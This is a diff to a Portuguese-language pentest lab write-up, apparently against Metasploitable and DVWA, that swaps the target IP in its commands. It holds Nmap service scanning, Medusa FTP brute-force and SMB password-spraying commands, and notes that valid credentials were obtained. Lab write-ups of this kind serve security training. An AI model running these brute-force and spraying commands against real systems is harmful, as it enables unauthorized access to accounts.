@@ -20,7 +20,7 @@ Verificação do IP das máquinas:
 
 Descoberta de Serviços
 Utilizei o Nmap para identificar serviços ativos:
-nmap -sV 192.168.56.101
+nmap -sV 172.31.45.1
 
 Serviços encontrados:
 FTP (porta 21)
@@ -29,20 +29,20 @@ HTTP (porta 80)
 
 Ataque de Força Bruta (FTP)
 Comando utilizado:
-medusa -h 192.168.56.101 -u msfadmin -P wordlists/passwords.txt -M ftp
+medusa -h 172.31.45.1 -u msfadmin -P wordlists/passwords.txt -M ftp
 Resultado:
 Acesso obtido com credenciais válidas.
 
 Ataque em Aplicação Web (DVWA)
 Passos:
 Acessei DVWA via navegador:
-http://192.168.56.101/dvwa
+http://172.31.45.1/dvwa
 Configurei nível de segurança para "low"
 Testei login com automação de tentativas
 
 Password Spraying (SMB)
 Comando:
-medusa -h 192.168.56.101 -U users.txt -p 123456 -M smbnt
+medusa -h 172.31.45.1 -U users.txt -p 123456 -M smbnt
 Objetivo:
 Testar uma senha comum para múltiplos usuários.
 
